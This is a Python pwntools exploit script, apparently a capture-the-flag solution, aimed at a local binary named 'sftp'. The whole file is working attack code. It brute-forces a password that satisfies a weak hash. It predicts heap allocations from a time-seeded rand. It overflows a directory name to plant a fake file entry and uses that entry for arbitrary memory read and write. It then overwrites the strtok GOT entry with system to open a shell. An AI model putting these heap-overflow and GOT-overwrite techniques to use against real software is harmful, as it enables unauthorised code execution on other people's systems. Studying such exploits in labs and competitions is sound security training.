from ctypes import CDLL
from pwn import *
from random import choice
from string import ascii_lowercase

def test_password(password):
    h = 0x5417
    for c in password:
        h ^= ord(c)
        h *= 2
        h &= 0xffff
    return h == 36346

def get_password():
    while True:
        password = "".join(chr(choice(list(range(0x20,0x7f)))) for _ in range(15))
        if test_password(password):
            return password

SYSTEM_OFFSET = 0x4c3a0
STRTOK_OFFSET = 0x9fe10

FILE_ENTRY = 2

libc = CDLL("libc.so.6")

password = get_password()

p = process('./sftp')

# Malloc emulation stuff
libc.srand(int(time.time()))  # Initialize srand at hopefully same time as process start up
mallocs = []
for _ in range(100):
    mallocs.append(libc.rand() & 0x1FFFFFFF | 0x40000000)

malloc_index = 0
def malloc():
    global malloc_index
    r = mallocs[malloc_index]
    malloc_index += 1
    return r

# Wrappers around put and get command
def put(p, filename, blob, new_file=True):
    if new_file:
        entry_addr = malloc()
    p.sendline(f'put {filename}'.encode())
    p.sendline(f'{len(blob)}'.encode())
    p.send(blob)
    data_addr = malloc()
    p.recvuntil(b'sftp> ')
    return entry_addr, data_addr

def get(p, filename):
    p.sendline(f'get {filename}'.encode())
    l = int(p.recvline().decode())
    r = p.recvn(l)
    p.recvuntil(b'sftp> ')
    return r

# Authenticate
p.recvuntil(b'Are you sure you want to continue connecting (yes/no)? ')
p.sendline(b'yes')
p.recvuntil(b'password: ')
p.sendline(password)
p.recvuntil(b'sftp> ')

# First malloc is C0ldbeef's entry, which has a parent pointer to the binary
coldbeef = malloc()
# Consuming further malloc's of init
for _ in range(5):
    malloc()

# Create directory with implanted 17th entry via overflow
dirname = b'C' * 20
dirname += b'D' * 8  # child_count, will be overwritten with p64(16)
dirname += b'E' * 8 * 17 # first 17 entries. first 16 will be memset to 0.
fake_file_addr = mallocs[malloc_index + 2]  # Lookahead to predict future allocation
dirname += p64(fake_file_addr)  # implanted 17th entry
dirname = dirname.rstrip(b'\0')
p.sendline(b"mkdir " + dirname)
print("[*] New directory at", hex(malloc()))
p.recvuntil(b'sftp> ')

#Enter directory
dirname = b'C' * 20 + b'\x10'
p.sendline(b'cd ' + dirname)
p.recvuntil(b'sftp> ')

# Create a "real_file". It's data will be our "fake_file".
put(p, "real_file", b'A'*0x100)
# Create some more files to expand number of childs and trigger realloc
for i in range(16):
  put(p, f'dummy{i}', b'A' * 8)

# Arbitrary read and write primitives
def read(addr):
    fake_file_data = p64(0)
    fake_file_data += p32(FILE_ENTRY)
    fake_file_data += "fake_file".ljust(20, '\0').encode()
    fake_file_data += p64(8)
    fake_file_data += p64(addr)
    put(p, "real_file", fake_file_data)
    return u64(get(p, "fake_file"))

def write(addr, value):
    fake_file_data = p64(0)
    fake_file_data += p32(FILE_ENTRY)
    fake_file_data += "fake_file".ljust(20, '\0').encode()
    fake_file_data += p64(8)
    fake_file_data += p64(addr)
    put(p, "real_file", fake_file_data)
    put(p, "fake_file", p64(value))

leak = read(coldbeef)
print("[*] Leak:", hex(leak))
base = leak - 0x208be0
srand_addr = base+0x205068
strtok_addr = base+0x2050c0
srand = read(srand_addr)
strtok = read(strtok_addr)

print("[*] srand:", hex(srand))
print("[*] strtok:", hex(strtok))
print("[*] Go lookup the strtok() and system() libc offset")

libc = strtok-STRTOK_OFFSET
system = libc+SYSTEM_OFFSET
write(strtok_addr, system)

p.sendline(b'cd /bin/sh')
p.interactive()
